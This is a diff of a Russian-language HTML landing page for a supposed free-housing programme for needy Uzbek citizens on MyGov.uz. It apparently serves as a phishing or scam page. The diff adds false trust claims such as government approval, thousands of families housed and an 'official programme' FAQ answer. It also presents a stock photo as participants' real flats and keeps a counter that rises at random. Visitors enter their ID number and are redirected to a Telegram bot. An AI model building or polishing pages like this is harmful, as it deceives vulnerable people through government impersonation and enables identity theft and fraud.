@@ -57,6 +57,7 @@
       <nav class="hidden md:flex space-x-8 text-gray-700 font-medium">
         <a href="#about" class="hover:text-primary">О программе</a>
         <a href="#conditions" class="hover:text-primary">Условия</a>
+        <a href="#security" class="hover:text-primary">Надёжность</a>
         <a href="#faq" class="hover:text-primary">FAQ</a>
         <a href="#contact" class="hover:text-primary">Контакты</a>
       </nav>
@@ -83,36 +84,57 @@
       <div class="bg-white p-8 rounded-2xl shadow-lg space-y-6">
         <h3 class="text-3xl font-bold text-primary">О программе</h3>
         <p class="text-gray-700 leading-relaxed">
-          Государственная программа по обеспечению бесплатным жильём социально незащищённых граждан Узбекистана через цифровую платформу MyGov.uz.
+          Программа поддержки нуждающихся граждан Узбекистана уже действует. Проверьте своё право и получите ключи от новой квартиры с помощью цифровой платформы MyGov.uz.
         </p>
+        <ul class="list-disc list-inside text-gray-700 space-y-2 mt-4">
+          <li>✅ Проверка занимает не более 2 минут</li>
+          <li>✅ Тысячи семей уже получили жильё</li>
+          <li>✅ Без очередей и взяток</li>
+        </ul>
+      </div>
+    </section>
+
+    <!-- Фото -->
+    <section class="w-full">
+      <div class="bg-white p-8 rounded-2xl shadow-lg text-center space-y-4">
+        <h3 class="text-3xl font-bold text-primary mb-4">Реальные квартиры участников программы</h3>
+        <img src="https://images.unsplash.com/photo-1600585154340-be6161a56a0c?ixlib=rb-4.0.3&auto=format&fit=crop&w=1000&q=80" class="rounded-lg shadow-md mx-auto w-full md:w-2/3" alt="Пример квартиры">
+      </div>
+    </section>
+
+    <!-- Надёжность -->
+    <section id="security" class="w-full">
+      <div class="bg-white p-8 rounded-2xl shadow-lg space-y-6">
+        <h3 class="text-3xl font-bold text-primary">Почему это безопасно и надёжно?</h3>
+        <ul class="list-disc list-inside text-gray-700 space-y-2">
+          <li>📌 Программа одобрена правительством</li>
+          <li>👨‍👩‍👧‍👦 Поддержка многодетных и малообеспеченных семей</li>
+          <li>🛡️ Гарантированная конфиденциальность</li>
+          <li>📍 Доступно по всей территории Узбекистана</li>
+        </ul>
       </div>
     </section>
 
     <!-- Условия участия -->
     <section id="conditions" class="w-full">
       <div class="bg-white p-8 rounded-2xl shadow-lg space-y-6">
-        <h3 class="text-3xl font-bold text-primary">Условия участия</h3>
-        <ul class="list-disc list-inside text-gray-700 space-y-2">
-          <li>Гражданство Республики Узбекистан</li>
-          <li>Постоянная регистрация</li>
-          <li>Приоритет многодетным и малообеспеченным семьям</li>
-          <li>Отсутствие другого жилья в собственности</li>
-        </ul>
+        <h3 class="text-3xl font-bold text-primary">Кто может получить жильё?</h3>
+        <p class="text-gray-700">Граждане, находящиеся в списках нуждающихся, зарегистрированные по месту жительства в Узбекистане.</p>
       </div>
     </section>
 
     <!-- FAQ -->
     <section id="faq" class="w-full">
       <div class="bg-white p-8 rounded-2xl shadow-lg space-y-6">
-        <h3 class="text-3xl font-bold text-primary">Часто задаваемые вопросы</h3>
+        <h3 class="text-3xl font-bold text-primary">Ответы на важные вопросы</h3>
         <div class="space-y-4">
           <div>
-            <h4 class="font-semibold text-lg text-primary">Кто может участвовать?</h4>
-            <p class="text-gray-700">Граждане, находящиеся в списках нуждающихся и отвечающие установленным критериям.</p>
+            <h4 class="font-semibold text-lg text-primary">Это официальная программа?</h4>
+            <p class="text-gray-700">Да, на базе инициатив государственной цифровизации и поддержки населения.</p>
           </div>
           <div>
-            <h4 class="font-semibold text-lg text-primary">Как подать заявку?</h4>
-            <p class="text-gray-700">Через проверку ИИН на данной платформе с последующим заполнением заявки.</p>
+            <h4 class="font-semibold text-lg text-primary">Это бесплатно?</h4>
+            <p class="text-gray-700">Да, проверка и подача заявки полностью бесплатны.</p>
           </div>
         </div>
       </div>
@@ -143,10 +165,9 @@
         alert('Пожалуйста, введите корректный ИИН.');
         return;
       }
-      window.location.href = "https://t.me/your_bot"; // Перенаправление после проверки
+      window.location.href = "https://t.me/your_bot";
     }
 
-    // Счётчик квартир
     let counter = document.getElementById('counter');
     setInterval(() => {
       counter.innerText = parseInt(counter.innerText) + Math.floor(Math.random() * 3);
